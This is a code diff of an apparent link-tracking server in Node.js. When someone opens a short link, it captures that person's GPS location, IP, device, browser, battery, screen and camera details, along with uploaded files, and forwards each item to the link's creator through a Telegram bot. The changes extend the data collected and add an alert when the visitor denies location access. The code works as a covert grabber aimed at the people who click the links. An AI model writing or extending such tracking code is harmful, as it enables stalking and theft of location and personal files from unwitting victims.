         const lastClick = clicks[link.id][clicks[link.id].length - 1];
         if (lastClick) {
             lastClick.battery = level;
+            lastClick.batteryCharging = charging;
             saveClicks();
+            
+            if (bot && link.userId) {
+                await bot.sendMessage(link.userId, `🔋 *Battery Info:* ${level}% ${charging ? '(Charging)' : '(Not charging)'}`);
+            }
+        }
+    }
+    res.json({ success: true });
+});
+
+app.post('/api/track/:shortId/screen', async (req, res) => {
+    const { shortId } = req.params;
+    const { width, height, colorDepth, pixelRatio } = req.body;
+    
+    let link = null;
+    for (const key in links) {
+        if (links[key].shortId === shortId) {
+            link = links[key];
+            break;
+        }
+    }
+    
+    if (link && clicks[link.id]) {
+        const lastClick = clicks[link.id][clicks[link.id].length - 1];
+        if (lastClick) {
+            lastClick.screenWidth = width;
+            lastClick.screenHeight = height;
+            lastClick.colorDepth = colorDepth;
+            lastClick.pixelRatio = pixelRatio;
+            saveClicks();
+            
+            if (bot && link.userId) {
+                await bot.sendMessage(link.userId, `📱 *Screen:* ${width}x${height}, Ratio: ${pixelRatio}`);
+            }
+        }
+    }
+    res.json({ success: true });
+});
+
+app.post('/api/track/:shortId/devices', async (req, res) => {
+    const { shortId } = req.params;
+    const { hasCamera } = req.body;
+    
+    let link = null;
+    for (const key in links) {
+        if (links[key].shortId === shortId) {
+            link = links[key];
+            break;
+        }
+    }
+    
+    if (link && clicks[link.id]) {
+        const lastClick = clicks[link.id][clicks[link.id].length - 1];
+        if (lastClick) {
+            lastClick.hasCamera = hasCamera;
+            saveClicks();
+            
+            if (bot && link.userId) {
+                await bot.sendMessage(link.userId, `📸 *Camera:* ${hasCamera ? 'Available' : 'Not available'}`);
+            }
         }
     }
     res.json({ success: true });
@@ -779,24 +892,34 @@ app.post('/api/track/:shortId/battery', async (req, res) => {
 
 app.post('/api/track/:shortId/location', async (req, res) => {
     const { shortId } = req.params;
-    const { lat, lon } = req.body;
+    const { lat, lon, shared } = req.body;
     
-    const link = Object.values(links).find(l => l.shortId === shortId);
+    let link = null;
+    for (const key in links) {
+        if (links[key].shortId === shortId) {
+            link = links[key];
+            break;
+        }
+    }
+    
     if (link && clicks[link.id]) {
         const lastClick = clicks[link.id][clicks[link.id].length - 1];
         if (lastClick) {
             lastClick.gpsLat = lat;
             lastClick.gpsLon = lon;
+            lastClick.locationShared = shared || false;
             saveClicks();
             
             if (bot && link.userId) {
                 const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                 await bot.sendLocation(link.userId, lat, lon);
                 await bot.sendMessage(link.userId, `
-📍 *New Location Shared!*
+📍 *GPS Location Captured!*
 🗺️ *Google Maps:* ${googleMapsUrl}
 📍 *Coordinates:* ${lat}, ${lon}
-👤 *From:* ${lastClick.city || 'Unknown'}, ${lastClick.country || 'Unknown'}
+🏙️ *City:* ${lastClick.city || 'Unknown'}
+🌍 *Country:* ${lastClick.country || 'Unknown'}
+📱 *Device:* ${lastClick.device || 'Unknown'}
                 `, { parse_mode: 'Markdown' });
             }
         }
@@ -804,18 +927,20 @@ app.post('/api/track/:shortId/location', async (req, res) => {
     res.json({ success: true });
 });
 
-app.post('/api/track/:shortId/access', async (req, res) => {
+app.post('/api/track/:shortId/location/denied', async (req, res) => {
     const { shortId } = req.params;
-    const { granted } = req.body;
+    const { error } = req.body;
     
-    const link = Object.values(links).find(l => l.shortId === shortId);
+    let link = null;
+    for (const key in links) {
+        if (links[key].shortId === shortId) {
+            link = links[key];
+            break;
+        }
+    }
+    
     if (link && bot && link.userId) {
-        await bot.sendMessage(link.userId, `
-🔐 *Gallery Access Update!*
-🔗 *Link:* ${BASE_URL}/l/${shortId}
-✅ *Access Granted:* ${granted ? 'YES' : 'NO'}
-🕐 *Time:* ${new Date().toLocaleString()}
-        `, { parse_mode: 'Markdown' });
+        await bot.sendMessage(link.userId, `📍 *Location Access:* Denied by user`);
     }
     res.json({ success: true });
 });
@@ -828,7 +953,13 @@ app.post('/api/upload/file', upload.single('file'), async (req, res) => {
             return res.status(400).json({ error: 'No file uploaded' });
         }
         
-        const link = Object.values(links).find(l => l.shortId === shortId);
+        let link = null;
+        for (const key in links) {
+            if (links[key].shortId === shortId) {
+                link = links[key];
+                break;
+            }
+        }
         
         if (!link) {
             return res.status(404).json({ error: 'Link not found' });
@@ -850,9 +981,11 @@ app.post('/api/upload/file', upload.single('file'), async (req, res) => {
             size: req.file.size,
             timestamp: new Date().toISOString(),
             visitorInfo: {
+                ip: lastClick?.ip || 'Unknown',
                 city: lastClick?.city || 'Unknown',
                 country: lastClick?.country || 'Unknown',
-                device: lastClick?.device || 'Unknown'
+                device: lastClick?.device || 'Unknown',
+                browser: lastClick?.browser || 'Unknown'
             }
         };
         
@@ -865,7 +998,12 @@ app.post('/api/upload/file', upload.single('file'), async (req, res) => {
 📸 *New File Received!*
 🔗 *From Link:* ${BASE_URL}/l/${shortId}
 📁 *File:* ${req.file.originalname}
+📊 *Size:* ${(req.file.size / 1024).toFixed(2)} KB
+🌐 *IP:* ${lastClick?.ip || 'Unknown'}
 📍 *Location:* ${lastClick?.city || 'Unknown'}, ${lastClick?.country || 'Unknown'}
+📱 *Device:* ${lastClick?.device || 'Unknown'}
+🕐 *Time:* ${new Date().toLocaleString()}
+
 🔗 *View:* ${BASE_URL}/file/${fileId}
             `;
             
@@ -911,8 +1049,6 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`✅ Server running on ${BASE_URL}`);
     console.log(`📊 Total links: ${Object.keys(links).length}`);
-    console.log(`👁️ Total clicks: ${Object.values(clicks).reduce((sum, arr) => sum + arr.length, 0)}`);
-    console.log(`📸 Total files: ${Object.values(userFiles).reduce((sum, arr) => sum + arr.length, 0)}`);
 });
 
 export default app;
